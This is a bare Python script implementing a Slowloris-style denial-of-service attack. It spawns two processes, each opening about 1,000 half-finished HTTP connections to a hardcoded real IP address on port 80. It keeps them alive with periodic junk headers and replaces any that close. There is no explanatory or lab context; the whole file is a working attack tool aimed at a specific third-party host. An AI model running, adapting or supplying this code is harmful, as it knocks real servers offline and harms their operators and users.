import socket
import time
import multiprocessing
import os
import random
from scapy.all import *
no_of_process = 2
list_process = []
host = "144.217.100.106"
port = 80
user_agent = "User-agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\r\n"

def attack():
    connections = []
    data = f"X-a:{random.randint(1,4000)}\r\n"

    def create_connection():
        my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            pid = os.getpid()
            print(f"Connecting from Process{pid}")
            my_socket.connect((host, port))
            my_socket.send(f"GET /?{random.randint(0,120)} HTTP/1.1\r\n".encode("utf-8"))
            my_socket.send(user_agent.encode("utf-8"))
            return my_socket

        except socket.error:
            print(f"Socket Error")
            my_socket.close()

    def send_data():
        for x in connections:
            try:
                x.send(data.encode("utf-8"))
                receive_data = x.recv(1024)
                print(f"Data from server:{receive_data}")
            except socket.error as msg:
                print(f"Error Sending{msg}")
                x.close()
                connections.remove(x)
                new_x = create_connection()
                connections.append(new_x)
        time.sleep(10)
        send_data()

    for z in range(0, 1000):
        returned_sock = create_connection()
        connections.append(returned_sock)

    send_data()


for i in range(0, no_of_process):
    process = multiprocessing.Process(target=attack, )
    process.start()
    list_process.append(process)

for i in range(0, no_of_process):
    list_process[i].join()
